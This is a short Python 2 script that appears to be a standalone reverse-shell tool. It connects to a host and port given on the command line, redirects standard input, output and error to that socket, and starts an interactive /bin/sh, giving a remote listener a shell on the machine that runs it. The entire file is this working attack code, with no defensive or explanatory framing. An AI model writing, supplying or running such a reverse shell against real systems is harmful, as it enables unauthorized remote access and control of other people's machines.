#!/usr/bin/python
import socket
import subprocess
import os
import sys

def build(lhost,lport):
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((str(lhost) , int(lport)))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])

try:
	lhost = sys.argv[1]
	lport = sys.argv[2]
	sys.exit
	build(lhost,lport)

except IndexError:
	print "Listener LHOST LPORT"

